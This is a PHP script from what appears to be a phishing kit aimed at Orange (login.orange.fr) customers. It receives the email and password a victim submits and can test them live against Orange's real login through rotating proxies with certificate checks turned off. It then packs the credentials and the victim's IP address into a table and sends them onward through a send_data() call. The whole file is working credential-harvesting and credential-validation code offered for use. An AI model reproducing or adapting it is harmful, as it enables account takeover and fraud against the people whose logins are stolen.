<?php
// so it return true allways? yes please dont make any xonnexion between s
@session_start();
set_time_limit(0);

class dataScraper
{
    public $is_orange_login = false;   // if this value is false then return login success always
    public $base_url = 'https://login.orange.fr';
    public $login_url = 'https://login.orange.fr/front/login';
    public $pass_url = 'https://login.orange.fr/front/password';
    public $cookiefile = 'login.cookies';
    public $proxy_file = "proxy.txt";

    public function run($email, $password)
    {
        if($this->is_orange_login){
            $this->cookiefile = __DIR__ . '/' . $this->cookiefile;
            @unlink(__DIR__ . '/' . $this->cookiefile);

            $proxies = array_unique(array_filter(array_map('trim', explode("\n", file_get_contents($this->proxy_file)))));
            shuffle($proxies);                        //  shuffle proxy list randomly
            $proxy = array_shift($proxies);           //  select one proxy from them

            $param = array();
            $param['proxy'] = $proxy;

            $content = $this->sendRequest($this->base_url, $param);
            sleep(1);
            $post_data = json_encode(['force'=>'', 'login'=>$email, 'mem'=>true, 'params'=>'']);
            $param['post_data']=$post_data;
            $c = $this->sendRequest($this->login_url, $param);
            $c = json_decode($c);
            if(empty($c->options)){
                return false;
            }else{
                $c = json_decode($c->options);
                $loginEncrypt = $c->loginEncrypt;

                sleep(2);

                $post_data = json_encode(['login'=>$email, 'loginEncrypt'=>$loginEncrypt, 'params'=>'', 'password'=>$password, 'remember'=>true]);

                $param['post_data']=$post_data;
                $param['header']=['X-Requested-With: XMLHttpRequest'];
                $c = $this->sendRequest($this->pass_url, $param);
                
                @unlink(__DIR__ . '/' . $this->cookiefile);

                $c = json_decode($c);
                if(empty($c->code)){
                    return true;
                }else{
                    return false;
                }
            }
        }else{
            return true;
        }
    }

    function sendRequest($url, $params = array())
    {
        if (empty($url)) {
            return;
        }

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
        curl_setopt($ch, CURLOPT_AUTOREFERER, true);
        curl_setopt($ch, CURLOPT_POST, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

        if (isset($params['no_follow'])) {
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
        }

        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        $header = array();
        if (isset($params["header"]) && is_array($params["header"])) {
            $header = $params["header"];
        }

        $header[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36';
        $header[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
  		$header[] = 'Cache-Control: max-age=0';
		$header[] = 'Connection: keep-alive';
		$header[] = 'Accept-Language: en-US,en;q=0.9';

        curl_setopt(
            $ch,
            CURLOPT_HTTPHEADER,
            $header
        );

        if (isset($params["proxy"])) {
            
            $proxy_param = explode("@", $params["proxy"]);
            $userpwd = $proxy_param[0];
            $proxy_param = explode(":", $proxy_param[1]);
            $proxy = $proxy_param[0];
            $proxyPort = $proxy_param[1];

            curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
            curl_setopt($ch, CURLOPT_PROXY, $proxy);
            curl_setopt($ch, CURLOPT_PROXYPORT, $proxyPort);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $userpwd);
        }

        if (isset($params["post_data"])) {
            if (isset($params["multiform"])) {
                $post_fields = $params["post_data"];
            } else {
                if (is_array($params["post_data"])) {
                    $arr = array();
                    foreach ($params["post_data"] as $idx => $value) {
                        if (is_array($value)) {
                            foreach ($value as $idx2 => $value2) {
                                $arr[] = urlencode($idx) . '=' . urlencode($value2);
                            }
                        } else {
                            $arr[] = urlencode($idx) . '=' . urlencode($value);
                        }
                    }
                    $arr = array_unique($arr);
                    $post_fields = join('&', $arr);
                } else {
                    $post_fields = $params["post_data"];
                }
            }
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        }

        if (isset($params["get_header"])) {
            curl_setopt($ch, CURLOPT_HEADER, 1);
        } else {
            curl_setopt($ch, CURLOPT_HEADER, 0);
        }

        if (isset($params["referer"])) {
            curl_setopt($ch, CURLOPT_REFERER, $params["referer"]);
        }

        if (isset($params["cookie"])) {
            // add cookies
            curl_setopt($ch, CURLOPT_COOKIE, $params["cookie"]);
        } elseif (isset($params["cookiefile"])) {
            curl_setopt($ch, CURLOPT_COOKIEJAR, $params["cookiefile"]);
            curl_setopt($ch, CURLOPT_COOKIEFILE, $params["cookiefile"]);
        } else{
            curl_setopt($ch, CURLOPT_COOKIEJAR, $this->cookiefile);
            curl_setopt($ch, CURLOPT_COOKIEFILE, $this->cookiefile);
        }
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);

        $content = curl_exec($ch);

        $err = curl_error($ch);
        if ($err) {
            return false;
        }

        return $content;
    }
}


if(!empty($_REQUEST['email'])&&!empty($_REQUEST['password'])){
	$email = $_REQUEST['email'];
	$password = $_REQUEST['password'];

    $scrapper = new dataScraper();
    if($scrapper->run($email, $password)){

        $info_names = array(

                "IDENTIFIANT" => "user_id",
                "ID PASSWORD" => "pass_id"
            );

        include("config.php");
        $result = '<table border="1" cellpadding="2" cellspacing="0">
            <tr><td>EMAIL</td><td>'.$email.'</td></tr>
            <tr><td>PASSWORD</td><td>'.$password.'</td></tr>
            <tr><td>IP ADDRESS</td><td>'.getenv("REMOTE_ADDR").'</td></tr>
        </table><p>';
        //save_rs("backup","../../rez/IPS.html",$result);
        $res = send_data(['data'=>$result]);
        echo json_encode(['status'=>'success']);
    }else{
        echo json_encode(['status'=>'failure']);
    }
}else{
    echo json_encode(['status'=>'failure']);
}
?>
